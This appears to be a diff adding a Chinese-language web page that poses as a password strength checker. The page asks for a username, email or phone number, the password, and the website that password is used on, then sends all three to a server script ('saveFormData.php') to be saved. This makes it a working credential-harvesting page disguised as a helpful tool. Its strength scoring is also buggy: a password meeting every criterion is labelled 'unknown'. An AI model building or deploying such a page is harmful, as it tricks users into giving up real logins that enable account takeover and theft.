@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+/* 在这里添加CSS样式 */
+input[type=text], input[type=email], input[type=password] {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  box-sizing: border-box;
+}
+
+input[type=submit] {
+  background-color: #4CAF50;
+  color: white;
+  padding: 14px 20px;
+  margin: 8px 0;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+}
+
+#passwordStrength {
+  margin-top: 10px;
+}
+</style>
+</head>
+<body>
+
+<input type="text" id="username" placeholder="输入用户名或邮箱或电话号码" name="username">
+<input type="password" id="psw" placeholder="输入密码" name="psw">
+<input type="text" id="website" placeholder="你是什么网站使用该密码" name="website">
+<div id="passwordStrength"></div>
+<input type="submit" value="提交" onclick="submitFormData()">
+
+<script>
+// 在这里添加JavaScript代码
+function submitFormData() {
+    var username = document.getElementById("username").value;
+    var psw = document.getElementById("psw").value;
+    var website = document.getElementById("website").value;
+    var strength = 0;
+    var strengthText = "";
+
+    // 如果密码长度小于6位，则强度为弱
+    if (psw.length >= 6) {
+        strength = 1;
+
+        // 检测密码的复杂性
+        if (psw.match(/[a-z]/)) strength++;
+        if (psw.match(/[A-Z]/)) strength++;
+        if (psw.match(/\d/)) strength++;
+        if (psw.match(/[^a-zA-Z\d]/)) strength++;
+    }
+
+    // 根据强度显示不同的信息
+    switch(strength) {
+        case 0:
+            strengthText = "太短";
+            break;
+        case 1:
+            strengthText = "弱";
+            break;
+        case 2:
+            strengthText = "中";
+            break;
+        case 3:
+            strengthText = "强";
+            break;
+        case 4:
+            strengthText = "非常强";
+            break;
+        default:
+            strengthText = "未知";
+    }
+    document.getElementById("passwordStrength").innerText = "密码强度: " + strengthText;
+
+    // 保存数据到服务器的逻辑
+    fetch('saveFormData.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: 'username=' + encodeURIComponent(username) + 
+              '&psw=' + encodeURIComponent(psw) + 
+              '&website=' + encodeURIComponent(website)
+    })
+    .then(response => response.text())
+    .then(result => {
+        alert(result);
+    })
+    .catch(error => {
+        console.error('保存数据时出错:', error);
+    });
+}
+</script>
+
+</body>
+</html>
